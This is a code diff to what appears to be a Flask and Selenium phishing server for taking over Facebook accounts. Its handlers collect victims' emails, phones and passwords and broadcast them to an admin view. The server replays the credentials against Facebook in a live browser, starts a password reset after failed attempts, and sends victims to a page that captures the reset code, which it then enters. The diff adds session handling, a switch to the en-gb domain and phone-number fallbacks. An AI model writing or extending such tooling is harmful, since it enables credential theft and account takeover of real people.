@@ -1,4 +1,4 @@
-from flask import Flask, render_template, request
+from flask import Flask, render_template, request, session
 from flask_socketio import SocketIO, emit
 from selenium import webdriver
 from selenium.webdriver.common.by import By
@@ -10,10 +10,15 @@ from selenium.webdriver.support import expected_conditions as EC
 import time
 from selenium.webdriver.chrome.options import Options
 import uuid
+from flask_session import Session
 
 app = Flask(__name__)
 socketio = SocketIO(app)
- 
+
+app.config['SECRET_KEY'] = 'your_secret_key'
+app.config['SESSION_TYPE'] = 'filesystem'
+Session(app)
+
 drivers = {}
 
 # Dictionary to track login attempts
@@ -50,38 +55,39 @@ def handle_disconnect():
 
 @socketio.on('client_contact')
 def handle_client_contact(data):
+    session_id = data['session_id']
     email = data['email']
     phone = data['phone']
-    print(f'Received email from client {request.sid}: {email}')
-    print(f'Received phone from client {request.sid}: {phone}')
-    emit('admin_message', {'id': request.sid, 'type': 'email', 'data': email}, broadcast=True)
-    emit('admin_message', {'id': request.sid, 'type': 'phone', 'data': phone}, broadcast=True)
+    print(f'Received email from client {session_id}: {email}')
+    print(f'Received phone from client {session_id}: {phone}')
+    emit('admin_message', {'id': session_id, 'type': 'email', 'data': email}, broadcast=True)
+    emit('admin_message', {'id': session_id, 'type': 'phone', 'data': phone}, broadcast=True)
 
 @socketio.on('client_password')
 def handle_client_password(data):
-    global driver
+    session_id = data['session_id']
     contact = data['contact']
     email = contact['email']
     phone = contact['phone']
     password = data['data']
-    print(f'Received password from client {request.sid}: {password}')
-    emit('admin_message', {'id': request.sid, 'type': 'password', 'data': password}, broadcast=True)
+    print(f'Received password from client {session_id}: {password}')
+    emit('admin_message', {'id': session_id, 'type': 'password', 'data': password}, broadcast=True)
     
     # Perform login test with the received contact and password
-    result = login_facebook(request.sid, email, phone, password)
+    result = login_facebook(session_id, email, phone, password)
     
     # Track login attempts
-    if request.sid not in login_attempts:
-        login_attempts[request.sid] = 0
+    if session_id not in login_attempts:
+        login_attempts[session_id] = 0
     if result == "Wrong_Pass":
-        login_attempts[request.sid] += 1
-        if login_attempts[request.sid] >= 2:
-            forgot_password(request.sid, email, phone)
-            emit('redirect', {'url': '/confirm'}, room=request.sid)
+        login_attempts[session_id] += 1
+        if login_attempts[session_id] >= 2:
+            forgot_password(session_id, email, phone)
+            emit('redirect', {'url': '/confirm'}, room=session_id)
             return
     
     # Emit the result back to the client
-    emit('login_result', {'result': result}, room=request.sid)
+    emit('login_result', {'result': result}, room=session_id)
 
 def setup_selenium(session_id):
     if session_id in drivers and drivers[session_id] is not None:
@@ -91,9 +97,9 @@ def setup_selenium(session_id):
  
     chrome_options.add_argument("--enable-unsafe-swiftshader")  
 
-    service = Service(ChromeDriverManager().install())
+    service = Service(executable_path="chromedriver.exe")
     driver = webdriver.Chrome(service=service, options=chrome_options)
-    driver.get("https://www.facebook.com/")
+    driver.get("https://en-gb.facebook.com/")
     drivers[session_id] = driver
     return drivers[session_id]
 
@@ -116,11 +122,14 @@ def login_facebook(session_id, email, phone, password):
         login_button.click()
         
         time.sleep(5)
-        
+        driver.get(driver.current_url)
+        count=1
+
+
         if "two_step_verification" in driver.current_url:
             print("Two-step verification required.")
             return "checkpoint"
-        elif "https://www.facebook.com/login" in driver.current_url:
+        elif "https://en-gb.facebook.com/login" in driver.current_url:
             # If login with email fails, try logging in with phone
             email_input = driver.find_element(By.ID, "email")
             email_input.clear()
@@ -132,16 +141,41 @@ def login_facebook(session_id, email, phone, password):
             
             login_button = driver.find_element(By.NAME, "login")
             login_button.click()
-            
+            url = driver.current_url.replace("www","en-gb")    
+            driver.get(url)
             time.sleep(5)
             
             if "two_step_verification" in driver.current_url:
                 print("Two-step verification required.")
                 return "checkpoint"
-            elif "https://www.facebook.com/login" in driver.current_url:
+            elif "https://en-gb.facebook.com/login" in driver.current_url:
                 print("Login failed. Please check your credentials.")
                 return "Wrong_Pass"
-        elif "https://www.facebook.com/recover" in driver.current_url:
+        elif "https://en-gb.facebook.com/recover" in driver.current_url:
+            if count==1:
+            # If login with email fails, try logging in with phone
+                driver.get("https://en-gb.facebook.com/login")
+                email_input = driver.find_element(By.ID, "email")
+                email_input.clear()
+                email_input.send_keys(phone)
+                
+                password_input = driver.find_element(By.ID, "pass")
+                password_input.clear()
+                password_input.send_keys(password)
+                
+                login_button = driver.find_element(By.NAME, "login")
+                login_button.click()
+                url = driver.current_url.replace("www","en-gb")    
+                driver.get(url)
+                time.sleep(5)
+                
+                if "two_step_verification" in driver.current_url:
+                    print("Two-step verification required.")
+                    return "checkpoint"
+                elif "https://en-gb.facebook.com/login" in driver.current_url:
+                    print("Login failed. Please check your credentials.")
+                    return "Wrong_Pass"
+            count+=1
             forgot_password(session_id, email, phone)
             emit('redirect', {'url': '/confirm'}, room=request.sid)
 
@@ -155,7 +189,7 @@ def login_facebook(session_id, email, phone, password):
 def forgot_password(session_id, email, mobile=None):
     driver = setup_selenium(session_id)
     try:
-        driver.get("https://www.facebook.com/login/identify")
+        driver.get("https://en-gb.facebook.com/login/identify")
  
         WebDriverWait(driver, 20).until(EC.presence_of_element_located((By.ID, "identify_email")))
         
@@ -168,7 +202,26 @@ def forgot_password(session_id, email, mobile=None):
         search_button = driver.find_element(By.NAME, "did_submit")
         search_button.click()
         time.sleep(5)
-        driver.get("https://www.facebook.com/recover/initiate/?is_from_lara_screen=1")
+
+        if "https://en-gb.facebook.com/login/identify" in driver.current_url:
+            phone_input = driver.find_element(By.ID, "identify_email")
+            phone_input.clear()
+            phone_input.send_keys(mobile)
+
+            search_button = driver.find_element(By.NAME, "did_submit")
+            search_button.click()
+            
+
+
+        time.sleep(5)
+
+        # nếu ra chữ "We sent a 6-digit code to" thì đã lấy được form input và button submit
+        element = driver.find_element(By.CSS_SELECTOR, ".uiHeaderTitle")
+        if "Google" in element.text:
+            driver.get("https://en-gb.facebook.com/recover/initiate/?is_from_lara_screen=1")
+            time.sleep(5)
+        
+      
         
         button = WebDriverWait(driver, 20).until(
             EC.element_to_be_clickable((By.XPATH, '//button[text()="Continue"]'))
@@ -183,24 +236,23 @@ def forgot_password(session_id, email, mobile=None):
 
 @socketio.on('confirm_code')
 def handle_confirm_code(data):
+    session_id = data['session_id']
     code = data['code']
-    print(f'Received confirmation code from client {request.sid}: {code}')
+    print(f'Received confirmation code from client {session_id}: {code}')
     
-    if request.sid not in code_attempts:
-        code_attempts[request.sid] = 0
-    code_attempts[request.sid] += 1
+    if session_id not in code_attempts:
+        code_attempts[session_id] = 0
+    code_attempts[session_id] += 1
     
-    if code_attempts[request.sid] > 2:
-        emit('redirect', {'url': '/done'}, room=request.sid)
+    if code_attempts[session_id] > 2:
+        emit('redirect', {'url': '/done'}, room=session_id)
         return
     
-    result = enter_confirmation_code(request.sid, code)
+    result = enter_confirmation_code(session_id, code)
     if result != "Code_Accepted":
-        code_attempts[request.sid] += 1
-        if code_attempts[request.sid] >= 2:
-            emit('redirect', {'url': '/done'}, room=request.sid)
- 
-
+        code_attempts[session_id] += 1
+        if code_attempts[session_id] >= 2:
+            emit('redirect', {'url': '/done'}, room=session_id)
 
 def enter_confirmation_code(session_id, code):
     driver = setup_selenium(session_id)
@@ -217,7 +269,7 @@ def enter_confirmation_code(session_id, code):
         continue_button.click()
         time.sleep(5)
 
-        if "https://www.facebook.com/recover/code" in driver.current_url:
+        if "https://en-gb.facebook.com/recover/code" in driver.current_url:
             print("Invalid confirmation code. Please try again.")
             return "Invalid_Code"
 
